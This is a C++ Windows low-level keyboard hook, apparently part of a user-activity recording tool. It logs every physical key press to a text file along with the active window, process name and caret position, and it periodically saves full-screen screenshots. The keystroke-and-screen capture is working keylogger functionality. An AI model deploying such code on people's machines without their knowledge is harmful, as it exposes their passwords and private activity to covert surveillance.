LRESULT CALLBACK LLKeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode < 0 || nCode == HC_NOREMOVE)
		return ::CallNextHookEx(NULL, nCode, wParam, lParam);
	
   if (lParam & 0x40000000)	// Check the previous key state
	{
		return ::CallNextHookEx(NULL, nCode, wParam, lParam);
	}

	if(wParam == WM_KEYDOWN)
	{
		//time_t timer;
		//time(&timer);

		KBDLLHOOKSTRUCT  *pkbhs = (KBDLLHOOKSTRUCT *)lParam;

		//check that the message is from keyboard or is synthesized by SendInput API
		if((pkbhs->flags & LLKHF_INJECTED))
			return ::CallNextHookEx(NULL, nCode, wParam, lParam);
		
		SYSTEMTIME sys;
		GetLocalTime( &sys );
		std::string strTime = GetSysLocalTimeStr(sys);

		HWND hwnd = GetForegroundWindow();
		std::string windowname = GetWindowNameStr(hwnd);
		ReplaceAll(windowname,"\n","\\n");
		ReplaceAll(windowname,"\t","\\t");

		DWORD processId;
		std::string processName = GetProcessNameStr(hwnd,&processId);

		std::string parentWindowName = GetNotNullParentNameStr(hwnd);

		FILE* fKeyBoardLog;
		errno_t err = _tfopen_s(&fKeyBoardLog,_T("log/keyboard.txt"),_T("a"));

		if(!IsNeedProcess(processName, windowname,parentWindowName))
		{
			fprintf_s(fKeyBoardLog,"%s\n", strTime.c_str());
			fprintf_s(fKeyBoardLog,"NOT LOGGED APPLICATION\n");
			fclose(fKeyBoardLog);
			return CallNextHookEx(NULL, nCode, wParam, lParam);
		}

		DWORD dwMsg = 1;
		dwMsg += pkbhs->scanCode << 16;
		dwMsg += pkbhs->flags << 24;

		CHAR strKey[80];
		GetKeyNameTextA(dwMsg,strKey,80);

		
		POINT point;
		GUITHREADINFO pg;
		pg.cbSize=48;
		::GetGUIThreadInfo(NULL,&pg);
		//HWND temphwnd=pg.hwndCaret;
		if (pg.hwndCaret)
		{
			point.x=pg.rcCaret.right;
			point.y=pg.rcCaret.bottom;
			::ClientToScreen(pg.hwndCaret,&point);
		}
		else
		{
			point.x = point.y = -1;
		}
		

		//FILE* fKeyBoardLog;
		//errno_t err = _tfopen_s(&fKeyBoardLog,_T("log/keyboard.txt"),_T("a"));
		if(err == 0)
		{
			printf_s("%s %s %s\n", windowname.c_str(), processName.c_str(), strKey);
			fprintf_s(fKeyBoardLog, "%s\n", strTime.c_str());
			fprintf_s(fKeyBoardLog, "%s\n", strKey);
			fprintf_s(fKeyBoardLog, "%d %d\n", point.x, point.y);
			fprintf_s(fKeyBoardLog, "%s\n", windowname.c_str());
			fprintf_s(fKeyBoardLog, "%s\n", processName.c_str());
			fprintf_s(fKeyBoardLog, "%s\n", parentWindowName.c_str());
			fclose(fKeyBoardLog);
		}
		else
		{
			printf_s("Open Key Log File Error\n");
		}

		//double interval =  difftime(timer,preKeyTimer);
		double interval = GetTimeDifference(preKeyTime,sys);	
		if(interval<0 || interval > 1)
		{
			preKeyTime = sys;
			/*
			RECT winRect;
			GetWindowRect(hwnd,&winRect);
			if(winRect.left<0)
			{
				winRect.right = winRect.right + winRect.left;
				winRect.left = 0;
			}
			if(winRect.top<0)
			{
				winRect.bottom = winRect.bottom + winRect.top;
				winRect.top = 0;
			}
			*/
			
			std::string img = "log/screen/" + strTime +  ".png";
			GetScreeny(SCREEN_RECT,from_string(img).c_str(),100);
		}
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}